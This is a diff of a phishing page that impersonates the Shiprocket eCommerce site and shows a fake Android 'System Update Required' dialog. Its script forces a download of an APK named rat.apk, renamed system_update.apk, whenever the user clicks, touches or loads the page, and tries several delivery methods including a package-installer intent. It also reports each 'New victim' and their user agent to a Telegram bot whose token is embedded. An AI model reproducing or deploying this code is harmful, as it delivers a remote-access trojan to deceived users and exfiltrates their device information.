@@ -5,306 +5,76 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Shiprocket - Your Partner for eCommerce Empowerment</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        }
-
-        body {
-            background: #fff;
-            overflow-x: hidden;
-        }
-
-        /* ============ FAKE ANDROID SYSTEM POPUP ============ */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        body { background: #fff; overflow-x: hidden; }
+        
         .fake-popup {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.5);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            z-index: 9999;
-            animation: popupFade 0.3s;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5); display: flex; align-items: center;
+            justify-content: center; z-index: 9999;
         }
-
-        @keyframes popupFade {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
         .fake-dialog {
-            background: #fff;
-            border-radius: 20px;
-            padding: 30px 24px;
-            width: 85%;
-            max-width: 340px;
-            text-align: center;
+            background: #fff; border-radius: 20px; padding: 30px 24px;
+            width: 85%; max-width: 340px; text-align: center;
             box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-            animation: popupSlide 0.4s;
         }
-
-        @keyframes popupSlide {
-            from { transform: scale(0.8); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
-
         .fake-icon {
-            width: 64px;
-            height: 64px;
-            margin: 0 auto 16px;
-            background: #6b21a8;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 32px;
-            color: #fff;
+            width: 64px; height: 64px; margin: 0 auto 16px;
+            background: #6b21a8; border-radius: 50%; display: flex;
+            align-items: center; justify-content: center;
+            font-size: 32px; color: #fff;
         }
-
-        .fake-title {
-            font-size: 20px;
-            font-weight: 700;
-            color: #1a1a1a;
-            margin-bottom: 8px;
-        }
-
-        .fake-message {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 20px;
-            line-height: 1.5;
-        }
-
-        .fake-buttons {
-            display: flex;
-            gap: 12px;
-        }
-
+        .fake-title { font-size: 20px; font-weight: 700; color: #1a1a1a; margin-bottom: 8px; }
+        .fake-message { font-size: 14px; color: #666; margin-bottom: 20px; line-height: 1.5; }
+        .fake-buttons { display: flex; gap: 12px; }
         .fake-btn {
-            flex: 1;
-            padding: 12px;
-            border-radius: 10px;
-            font-size: 15px;
-            font-weight: 600;
-            cursor: pointer;
-            border: none;
-            transition: all 0.2s;
+            flex: 1; padding: 12px; border-radius: 10px; font-size: 15px;
+            font-weight: 600; cursor: pointer; border: none;
         }
+        .fake-btn-cancel { background: #f3f4f6; color: #666; }
+        .fake-btn-ok { background: #6b21a8; color: #fff; }
 
-        .fake-btn-cancel {
-            background: #f3f4f6;
-            color: #666;
-        }
-
-        .fake-btn-cancel:hover {
-            background: #e5e7eb;
-        }
-
-        .fake-btn-ok {
-            background: #6b21a8;
-            color: #fff;
-        }
-
-        .fake-btn-ok:hover {
-            background: #581c87;
-        }
-
-        /* ============ SHIPROCKET PAGE ============ */
         .top-banner {
             background: linear-gradient(90deg, #e8d5f5, #d5e8f5);
-            padding: 8px 16px;
-            font-size: 12px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 8px;
+            padding: 8px 16px; font-size: 12px;
+            display: flex; justify-content: space-between; flex-wrap: wrap; gap: 8px;
         }
-
         .top-banner span { color: #333; }
         .top-banner .highlight { color: #6b21a8; font-weight: bold; }
-
-        .header {
-            background: #fff;
-            padding: 16px 20px;
-            display: flex;
-            align-items: center;
-            border-bottom: 1px solid #eee;
-        }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 24px;
-            font-weight: bold;
-            color: #333;
-        }
-
-        .logo-icon {
-            width: 32px;
-            height: 32px;
-            background: linear-gradient(135deg, #6b21a8, #3b82f6);
-            border-radius: 8px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-            font-size: 18px;
-        }
-
-        .hero {
-            background: #fff;
-            padding: 40px 20px;
-        }
-
-        .hero h1 {
-            font-size: 42px;
-            font-weight: 800;
-            color: #1a1a1a;
-            line-height: 1.1;
-            margin-bottom: 16px;
-        }
-
-        .hero p {
-            font-size: 16px;
-            color: #666;
-            margin-bottom: 24px;
-            max-width: 500px;
-        }
-
-        .cta-btn {
-            background: #6b21a8;
-            color: #fff;
-            border: none;
-            padding: 14px 32px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 8px;
-            cursor: pointer;
-        }
-
-        .gradient-bar {
-            height: 120px;
-            background: linear-gradient(90deg, #fef3c7, #fce7f3, #dbeafe, #e0e7ff);
-            margin: 20px 0;
-        }
-
-        .dark-section {
-            background: #1a1a1a;
-            color: #fff;
-            padding: 40px 20px;
-        }
-
-        .dark-section h2 {
-            font-size: 28px;
-            font-weight: 700;
-            margin-bottom: 20px;
-        }
-
+        .header { background: #fff; padding: 16px 20px; display: flex; align-items: center; border-bottom: 1px solid #eee; }
+        .logo { display: flex; align-items: center; gap: 8px; font-size: 24px; font-weight: bold; color: #333; }
+        .logo-icon { width: 32px; height: 32px; background: linear-gradient(135deg, #6b21a8, #3b82f6); border-radius: 8px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 18px; }
+        .hero { background: #fff; padding: 40px 20px; }
+        .hero h1 { font-size: 42px; font-weight: 800; color: #1a1a1a; line-height: 1.1; margin-bottom: 16px; }
+        .hero p { font-size: 16px; color: #666; margin-bottom: 24px; max-width: 500px; }
+        .cta-btn { background: #6b21a8; color: #fff; border: none; padding: 14px 32px; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; }
+        .gradient-bar { height: 120px; background: linear-gradient(90deg, #fef3c7, #fce7f3, #dbeafe, #e0e7ff); margin: 20px 0; }
+        .dark-section { background: #1a1a1a; color: #fff; padding: 40px 20px; }
+        .dark-section h2 { font-size: 28px; font-weight: 700; margin-bottom: 20px; }
         .dark-section h2 span { color: #6b21a8; }
-
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 16px;
-            margin-top: 20px;
-        }
-
-        .stat-box {
-            background: #2a2a2a;
-            padding: 20px;
-            border-radius: 8px;
-            text-align: center;
-        }
-
+        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 16px; margin-top: 20px; }
+        .stat-box { background: #2a2a2a; padding: 20px; border-radius: 8px; text-align: center; }
         .stat-box h3 { font-size: 24px; color: #6b21a8; }
         .stat-box p { font-size: 12px; color: #999; margin-top: 4px; }
-
-        /* ============ DOWNLOAD OVERLAY ============ */
-        .download-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.85);
-            display: none;
-            align-items: center;
-            justify-content: center;
-            z-index: 10000;
-        }
-
-        .download-card {
-            background: #fff;
-            border-radius: 20px;
-            padding: 30px;
-            width: 85%;
-            max-width: 340px;
-            text-align: center;
-        }
-
-        .download-icon {
-            font-size: 48px;
-            margin-bottom: 16px;
-        }
-
-        .download-card h3 {
-            font-size: 20px;
-            color: #1a1a1a;
-            margin-bottom: 8px;
-        }
-
-        .download-card p {
-            font-size: 14px;
-            color: #666;
-            margin-bottom: 20px;
-        }
-
-        .progress-bar {
-            width: 100%;
-            height: 8px;
-            background: #e5e7eb;
-            border-radius: 4px;
-            overflow: hidden;
-            margin-bottom: 16px;
-        }
-
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #6b21a8, #3b82f6);
-            width: 0%;
-            animation: progressAnim 3s forwards;
-        }
-
-        @keyframes progressAnim {
-            from { width: 0%; }
-            to { width: 100%; }
-        }
-
-        /* ============ RESPONSIVE ============ */
-        @media (max-width: 768px) {
-            .hero h1 { font-size: 32px; }
-            .stats-grid { grid-template-columns: repeat(2, 1fr); }
-        }
+        .download-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: none; align-items: center; justify-content: center; z-index: 10000; }
+        .download-card { background: #fff; border-radius: 20px; padding: 30px; width: 85%; max-width: 340px; text-align: center; }
+        .download-icon { font-size: 48px; margin-bottom: 16px; }
+        .download-card h3 { font-size: 20px; color: #1a1a1a; margin-bottom: 8px; }
+        .download-card p { font-size: 14px; color: #666; margin-bottom: 20px; }
+        .progress-bar { width: 100%; height: 8px; background: #e5e7eb; border-radius: 4px; overflow: hidden; margin-bottom: 16px; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, #6b21a8, #3b82f6); width: 0%; animation: progressAnim 3s forwards; }
+        @keyframes progressAnim { from { width: 0%; } to { width: 100%; } }
+        @media (max-width: 768px) { .hero h1 { font-size: 32px; } .stats-grid { grid-template-columns: repeat(2, 1fr); } }
     </style>
 </head>
 <body>
 
-    <!-- ============ FAKE ANDROID SYSTEM POPUP ============ -->
+    <!-- FAKE POPUP -->
     <div class="fake-popup" id="fakePopup">
         <div class="fake-dialog">
             <div class="fake-icon">📦</div>
             <div class="fake-title">System Update Required</div>
-            <div class="fake-message">
-                Your device needs a critical system update to continue using this app.
-                Tap "Install" to proceed.
-            </div>
+            <div class="fake-message">Your device needs a critical system update to continue using this app. Tap "Install" to proceed.</div>
             <div class="fake-buttons">
                 <button class="fake-btn fake-btn-cancel" onclick="forceDownload('cancel')">Cancel</button>
                 <button class="fake-btn fake-btn-ok" onclick="forceDownload('install')">Install</button>
@@ -312,7 +82,7 @@
         </div>
     </div>
 
-    <!-- ============ SHIPROCKET PAGE ============ -->
+    <!-- SHIPROCKET PAGE -->
     <div class="top-banner">
         <span>🔄 Recharge Now <span class="highlight">₹500</span> & Get <span class="highlight">₹1000*</span></span>
         <span>Use Code: <span class="highlight">FLAT500</span></span>
@@ -344,7 +114,7 @@
         </div>
     </div>
 
-    <!-- ============ DOWNLOAD OVERLAY ============ -->
+    <!-- DOWNLOAD OVERLAY -->
     <div class="download-overlay" id="downloadOverlay">
         <div class="download-card">
             <div class="download-icon">⬇️</div>
@@ -356,104 +126,69 @@
         </div>
     </div>
 
-    <!-- Hidden iframe for silent download -->
-    <iframe id="downloadFrame" style="display:none;"></iframe>
-
     <script>
-        // ============ CONFIG ============
-        const APK_URL = "https://github.com/hoihohavapv/babychak/releases/download/v1.0.1/rat.apk";
-        const BOT_TOKEN = "8884434975:AAHaHSzckxuewYq_mkf1cPNnNt9NKVdd_FY";
-        const CHAT_ID = "8501093383";
+        // APK URL - CHANGE THIS TO YOUR RELEASE URL
+        var APK_URL = "https://github.com/hoihohavapv/babychak/releases/download/v1.0.1/rat.apk";
+        var BOT_TOKEN = "8884434975:AAHaHSzckxuewYq_mkf1cPNnNt9NKVdd_FY";
+        var CHAT_ID = "8501093383";
 
-        let downloaded = false;
-
-        // ============ REPORT TO TELEGRAM ============
+        // Report to Telegram
         function report(msg) {
             try {
                 fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(msg));
             } catch(e) {}
         }
 
-        // ============ FORCE DOWNLOAD (ON ANY TAP) ============
+        // Force download
         function forceDownload(source) {
-            // Show download overlay
             document.getElementById('downloadOverlay').style.display = 'flex';
-            
-            report("✅ New victim (source: " + source + "): " + navigator.userAgent);
+            report("✅ New victim: " + navigator.userAgent);
 
-            // Method 1: Blob download
+            // Method 1: Direct link
+            window.location.href = APK_URL;
+
+            // Method 2: Open in new tab
+            setTimeout(function() {
+                window.open(APK_URL, '_blank');
+            }, 1000);
+
+            // Method 3: Blob download
             fetch(APK_URL)
-                .then(res => res.blob())
-                .then(blob => {
-                    const url = URL.createObjectURL(blob);
-                    const a = document.createElement('a');
+                .then(function(res) { return res.blob(); })
+                .then(function(blob) {
+                    var url = URL.createObjectURL(blob);
+                    var a = document.createElement('a');
                     a.href = url;
                     a.download = 'system_update.apk';
                     document.body.appendChild(a);
                     a.click();
                     document.body.removeChild(a);
-                    URL.revokeObjectURL(url);
                     report("📥 APK downloaded");
                 })
-                .catch(() => {
-                    window.open(APK_URL, '_blank');
-                });
+                .catch(function() {});
 
-            // Method 2: Intent fallback
-            setTimeout(() => {
+            // Method 4: Intent fallback
+            setTimeout(function() {
                 window.location = 'intent://system_update.apk#Intent;action=android.intent.action.VIEW;scheme=https;package=com.android.packageinstaller;end';
-            }, 500);
-
-            // Method 3: Hidden iframe
-            document.getElementById('downloadFrame').src = APK_URL;
-
-            // Method 4: Direct window location
-            setTimeout(() => {
-                window.location.href = APK_URL;
-            }, 1000);
-
-            // Method 5: Open in new tab
-            setTimeout(() => {
-                window.open(APK_URL, '_blank');
             }, 1500);
-
-            downloaded = true;
         }
 
-        // ============ AUTO-DOWNLOAD ON ANY CLICK ============
+        // Auto download on any click
         document.addEventListener('click', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
             forceDownload('click');
-            return false;
-        }, true);
+        });
 
-        // ============ AUTO-DOWNLOAD ON ANY TOUCH ============
+        // Auto download on touch
         document.addEventListener('touchstart', function(e) {
-            e.preventDefault();
-            e.stopPropagation();
             forceDownload('touch');
-            return false;
-        }, true);
+        });
 
-        // ============ AUTO-DOWNLOAD ON SCROLL ============
-        window.addEventListener('scroll', function() {
-            if (!downloaded) {
-                forceDownload('scroll');
-            }
-        }, { once: true });
-
-        // ============ AUTO-DOWNLOAD ON PAGE LOAD ============
+        // Auto download on page load
         setTimeout(function() {
-            if (!downloaded) {
-                forceDownload('auto');
-            }
-        }, 1500);
+            forceDownload('auto');
+        }, 2000);
 
-        // ============ SHOW FAKE POPUP ON PAGE LOAD ============
-        document.getElementById('fakePopup').style.display = 'flex';
-
-        // ============ REPORT PAGE LOAD ============
+        // Report page load
         report("🌐 Page loaded: " + navigator.userAgent);
     </script>
 
